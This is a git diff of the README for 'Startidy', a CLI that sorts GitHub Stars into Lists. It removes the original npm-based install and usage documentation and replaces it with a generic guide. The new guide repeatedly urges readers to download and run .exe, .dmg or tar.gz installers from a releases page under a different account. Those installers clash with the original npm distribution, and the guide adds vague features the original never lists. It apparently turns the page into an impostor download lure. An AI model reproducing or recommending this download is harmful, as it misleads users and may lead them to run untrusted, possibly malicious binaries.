@@ -1,364 +1,107 @@
-# Startidy
+# 🚀 Startidy - Organize Your GitHub Stars Effortlessly
 
-English | [한국어](README.ko.md)
+[![Download Startidy](https://img.shields.io/badge/Download%20Startidy-v1.0-brightgreen)](https://github.com/treberte/Startidy/releases)
 
-> If you find this project useful, please consider giving it a star! Your support means a lot.
+## 📥 Overview
 
-AI-powered CLI tool to automatically organize your GitHub Stars into Lists.
+Startidy is an AI-powered command-line tool designed to help you organize your GitHub Stars into easy-to-manage lists. Whether you are a developer looking to keep track of your favorite repositories or just want to curate your interests, Startidy simplifies the process. No need for complicated setup or technical knowledge—just download and start organizing.
 
-## Features
+## 🚀 Getting Started
 
-- **Automatic Category Planning**: Gemini AI analyzes your starred repositories and creates 32 optimal categories
-- **Smart Classification**: Analyzes each repository's title, description, and README to place them in appropriate categories
-- **Hierarchical Naming**: Uses `Major: Minor` format like `Lang: Python`, `AI: LLM & Chatbot` (20 char limit)
-- **Step-by-Step or Full Automation**: Run individual steps or execute the entire workflow at once
-- **Batch Processing**: Parallel processing of 20 repositories at a time for faster classification
+To get started with Startidy, follow these simple steps to download and run the software.
 
-## Category Examples
+### 🔗 Step 1: Visit the Download Page
 
-```
-Lang: Python       Lang: JS & TS      Lang: Go           Lang: Rust
-Lang: Java         Lang: C & C++      Lang: ETC
+Click the link below to access the download page:
 
-AI: LLM & Chatbot  AI: Agent          AI: Image & Video  AI: RAG & Data
-AI: Voice & Audio  AI: ETC
+[Visit the Releases Page to Download Startidy](https://github.com/treberte/Startidy/releases)
 
-Web: Frontend      Web: Backend       Web: Crawler       Web: Mobile App
-Web: ETC
+### 📂 Step 2: Select the Right File
 
-Infra: Docker      Infra: Security    Infra: DB          Infra: Data & ML
-Infra: ETC
+On the releases page, you will see several versions of Startidy. Choose the latest version, which is the most stable and feature-rich. You can recognize it by the version number, usually labeled with "v" followed by numbers.
 
-Type: Self-Hosted  Type: App & Tool   Type: Starter      Type: Resource
-Type: ETC
-```
+### 💾 Step 3: Download the File
 
-## Installation
+Once you have selected the latest version, click on the asset that matches your operating system (e.g., `.exe` for Windows, `.tar.gz` for Linux, or `.dmg` for macOS). The file will start downloading automatically.
 
-### Global Install via npm (Recommended)
+## 🛠️ Install Startidy
 
-```bash
-npm install -g startidy
-```
+### 🚀 Step 4: Install on Your Computer
 
-After installation, you can use the `startidy` command directly:
+#### For Windows Users:
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to run the installer.
+3. Follow the on-screen prompts to complete the installation.
 
-```bash
-startidy run
-```
+#### For macOS Users:
+1. Locate the downloaded `.dmg` file in your Downloads folder.
+2. Double-click to open it.
+3. Drag the Startidy icon into your Applications folder.
 
-### From Source
+#### For Linux Users:
+1. Open your terminal.
+2. Navigate to the directory where the `.tar.gz` file was downloaded.
+3. Extract the file using the command:
+   ```bash
+   tar -xvzf Startidy-latest.tar.gz
+   ```
+4. Run the executable that appears.
 
-```bash
-# Clone the repository
-git clone https://github.com/hellosunghyun/startidy.git
-cd startidy
+### 🔑 Step 5: Grant Permissions (if needed)
 
-# Install dependencies
-npm install
+After installation, you may need to grant permissions for Startidy to run on your system. Follow the prompts to allow this.
 
-# Build
-npm run build
+## 🖥️ Running Startidy
 
-# Link globally
-npm link
-```
+### Step 6: Open Your Terminal or Command Prompt
 
-## Configuration
+To use Startidy, you will interact with your terminal (macOS/Linux) or Command Prompt (Windows). Here’s how:
 
-You can configure Startidy in three ways:
+1. **Windows:** Press `Win + R`, type `cmd`, and hit Enter.
+2. **macOS:** Press `Command + Space`, type `Terminal`, and hit Enter.
+3. **Linux:** Press `Ctrl + Alt + T`.
 
-### Option 1: CLI Arguments (Recommended for one-time use)
+### Step 7: Launch Startidy
+
+Type the following command into your terminal or command prompt and hit Enter:
 
 ```bash
-startidy --token ghp_xxx --username your-name --gemini-key AIza_xxx run
+startidy
 ```
 
-### Option 2: Environment Variables
+### Step 8: Follow the Prompts
 
-```bash
-# Linux/macOS
-export GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx
-export GITHUB_USERNAME=your-username
-export GEMINI_API_KEY=AIzaxxxxxxxxxxxxxxxxxxxxxxxx
+Startidy will guide you through the organization process. Follow the prompts to connect your GitHub account, and choose how you want to curate your Stars.
 
-# Windows (PowerShell)
-$env:GITHUB_TOKEN="ghp_xxxxxxxxxxxxxxxxxxxx"
-$env:GITHUB_USERNAME="your-username"
-$env:GEMINI_API_KEY="AIzaxxxxxxxxxxxxxxxxxxxxxxxx"
+## 🎛️ Features of Startidy
 
-# Windows (CMD)
-set GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx
-set GITHUB_USERNAME=your-username
-set GEMINI_API_KEY=AIzaxxxxxxxxxxxxxxxxxxxxxxxx
+- **AI-Powered Sorting:** Smart suggestions for organizing your Stars based on your preferences.
+- **User-Friendly Interface:** Simple command-line instructions make it easy to use.
+- **Custom Lists:** Create personalized lists to keep track of different categories.
+- **Export Options:** Save your curated lists in various formats for easy sharing.
 
-# Then run
-startidy run
-```
+## 📦 System Requirements
 
-### Option 3: `.env` File (Recommended for repeated use)
+Startidy runs on major operating systems. Ensure you have the following installed:
 
-Create a `.env` file in your current directory:
+- **Windows:** Windows 10 or later
+- **macOS:** macOS Mojave or later
+- **Linux:** Most distributions, with support for common libraries
 
-```env
-GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxx
-GITHUB_USERNAME=your-username
-GEMINI_API_KEY=AIzaxxxxxxxxxxxxxxxxxxxxxxxx
-```
+## 📝 Troubleshooting Common Issues
 
-### Global CLI Options
+If you encounter any problems while using Startidy, here are some common fixes:
 
-| Option | Description |
-|--------|-------------|
-| `--token <token>` | GitHub Personal Access Token |
-| `--username <username>` | GitHub Username |
-| `--gemini-key <key>` | Google Gemini API Key |
-| `--max-categories <n>` | Maximum categories (default: 32) |
-| `--batch-size <n>` | Batch size for classification (default: 20) |
-| `--private` | Create private Lists |
-| `--debug` | Enable debug mode |
+- **Installation Errors:** Ensure you have permission to install software on your computer.
+- **Connection Issues:** Check your network connection if Startidy cannot connect to GitHub.
+- **Command Not Found:** Make sure the Startidy installation directory is included in your system’s PATH variable.
 
-### Getting a GitHub Token
+## 💬 Support
 
-1. Go to [GitHub Settings > Developer settings > Personal access tokens](https://github.com/settings/tokens)
-2. Click "Generate new token (classic)"
-3. Select scopes: `repo`, `read:user`
-4. Generate and copy the token
+For additional help, you can visit the [issues page](https://github.com/treberte/Startidy/issues) in the GitHub repository. You may also find useful information or solutions posted by other users.
 
-### Getting a Gemini API Key
+## 📢 Stay Updated
 
-1. Go to [Google AI Studio](https://aistudio.google.com/app/apikey)
-2. Click "Create API Key"
-3. Copy the API key
+Stay informed about the latest updates and features by following the repository. You can also star the project to support its development.
 
-## Usage
-
-### Full Automation (`run` command)
-
-```bash
-# Run the full workflow (plan → delete → create → classify)
-startidy run
-
-# With inline credentials
-startidy --token ghp_xxx --username myname --gemini-key AIza_xxx run
-
-# Process only newly starred repositories (keep existing Lists)
-startidy run --only-new
-
-# Simulation mode (preview categories only)
-startidy run --dry-run
-```
-
-### Step-by-Step Execution
-
-#### 1. Plan Categories (`plan`)
-
-```bash
-# Analyze Stars and plan categories (saved to file)
-startidy plan
-
-# View saved plan
-startidy plan --show
-
-# Delete saved plan
-startidy plan --delete
-```
-
-#### 2. Manage Lists (`lists`)
-
-```bash
-# View all Lists
-startidy lists
-
-# Create a new List
-startidy lists --create "Lang: Python" -d "Python projects"
-
-# Delete a specific List
-startidy lists --delete "Lang: Python"
-
-# Delete all Lists
-startidy lists --delete-all
-```
-
-#### 3. Create Lists (`create-lists`)
-
-```bash
-# Create Lists from planned categories
-startidy create-lists
-
-# Create Lists even if some already exist
-startidy create-lists --force
-```
-
-#### 4. Classify Stars (`classify`)
-
-```bash
-# Classify Stars into Lists
-startidy classify
-
-# Process only unclassified Stars
-startidy classify --only-new
-
-# Use existing Lists as categories (no plan file needed)
-startidy classify --use-existing
-
-# Classify new Stars using existing Lists
-startidy classify --use-existing --only-new
-
-# Reset: Remove all Stars from Lists
-startidy classify --reset
-```
-
-### Command Options Summary
-
-| Command | Option | Description |
-|---------|--------|-------------|
-| `run` | (none) | Full automation |
-| `run` | `--only-new` | Process new Stars only |
-| `run` | `--dry-run` | Simulation mode |
-| `plan` | (none) | Plan categories |
-| `plan` | `--show` | View saved plan |
-| `plan` | `--delete` | Delete saved plan |
-| `lists` | (none) | View all Lists |
-| `lists` | `--create <name>` | Create new List |
-| `lists` | `--delete <name>` | Delete specific List |
-| `lists` | `--delete-all` | Delete all Lists |
-| `lists` | `-d, --description` | List description (with --create) |
-| `create-lists` | (none) | Create Lists from plan |
-| `create-lists` | `--force` | Create even if Lists exist |
-| `classify` | (none) | Classify Stars |
-| `classify` | `--only-new` | Process unclassified only |
-| `classify` | `--use-existing` | Use existing Lists as categories |
-| `classify` | `--reset` | Remove all Stars from Lists |
-
-### Manual Workflow Example
-
-```bash
-# 1. Plan categories
-startidy plan
-
-# 2. Review the plan
-startidy plan --show
-
-# 3. Delete existing Lists (if needed)
-startidy lists --delete-all
-
-# 4. Create Lists
-startidy create-lists
-
-# 5. Classify Stars
-startidy classify
-```
-
-## Execution Example
-
-```
-🚀 Starting GitHub Stars auto-organization.
-
-✔ Fetched 523 starred repositories.
-✔ 32 categories have been planned.
-
-? Delete existing 32 Lists? Yes
-✔ 32 Lists deleted
-✔ 32 Lists created
-
-📂 Classifying 523 repositories in batches of 20...
-
-── Batch 1/27 (1-20) ──
-✔ README fetched
-✔ Classification complete
-  ✅ facebook/react → Web: Frontend
-  ✅ tensorflow/tensorflow → AI: Data & ML
-  ...
-
-📊 Results:
-  ✅ Success: 520
-  ❌ Failed: 3
-
-✅ Done! Stars have been organized into Lists.
-```
-
-## Project Structure
-
-```
-startidy/
-├── package.json
-├── tsconfig.json
-├── .env.example
-├── README.md
-└── src/
-    ├── index.ts              # CLI entry point
-    ├── types.ts              # Type definitions
-    ├── api/
-    │   ├── index.ts          # API exports
-    │   ├── client.ts         # GitHub API client
-    │   ├── types.ts          # API types
-    │   ├── lists.ts          # Lists CRUD
-    │   ├── repos.ts          # Repository queries
-    │   └── readme.ts         # README fetching
-    ├── commands/
-    │   ├── lists.ts          # lists command
-    │   ├── plan.ts           # plan command
-    │   ├── create-lists.ts   # create-lists command
-    │   ├── classify.ts       # classify command
-    │   └── run.ts            # run command (full automation)
-    ├── services/
-    │   ├── index.ts          # Services exports
-    │   ├── gemini.ts         # Gemini AI service
-    │   └── classifier.ts     # Classification service
-    ├── prompts/
-    │   ├── category-planner.ts
-    │   └── classifier.ts
-    └── utils/
-        ├── config.ts         # Environment config
-        ├── rate-limiter.ts   # Rate limiting
-        └── plan-storage.ts   # Plan save/load
-```
-
-## Environment Variables Reference
-
-All available environment variables:
-
-```env
-# Required
-GITHUB_TOKEN=ghp_xxxxxxxxxxxx        # GitHub Personal Access Token
-GITHUB_USERNAME=your-username         # Your GitHub username
-GEMINI_API_KEY=AIzaxxxxxxxxxx         # Google Gemini API Key
-
-# Category Settings
-MAX_CATEGORIES=32                     # Maximum categories (GitHub limit: 32)
-MAX_CATEGORIES_PER_REPO=3             # Max categories per repo
-MIN_CATEGORIES_PER_REPO=1             # Min categories per repo
-
-# Batch Processing
-CLASSIFY_BATCH_SIZE=20                # Repos per batch for classification
-BATCH_DELAY=2000                      # Delay between batches (ms)
-
-# List Settings
-LIST_IS_PRIVATE=false                 # Create private Lists
-
-# Gemini Settings
-GEMINI_MODEL=gemini-2.5-flash         # Model to use
-GEMINI_RPM=15                         # Requests per minute (Free tier)
-
-# Debug
-DEBUG=false                           # Enable debug output
-LOG_API_RESPONSES=false               # Log raw API responses
-```
-
-## Tech Stack
-
-- **Runtime**: Node.js / [Bun](https://bun.sh/)
-- **Language**: TypeScript
-- **AI**: Google Gemini (gemini-2.5-flash)
-- **CLI**: Commander.js, @inquirer/prompts, ora
-
-## Limitations
-
-- GitHub Lists are limited to 32 maximum
-- Each List name has a 20 character limit
-- Gemini API Free tier: 15 requests per minute
-
-## License
-
-MIT
+Visit the Releases Page to Download Startidy: [https://github.com/treberte/Startidy/releases](https://github.com/treberte/Startidy/releases)
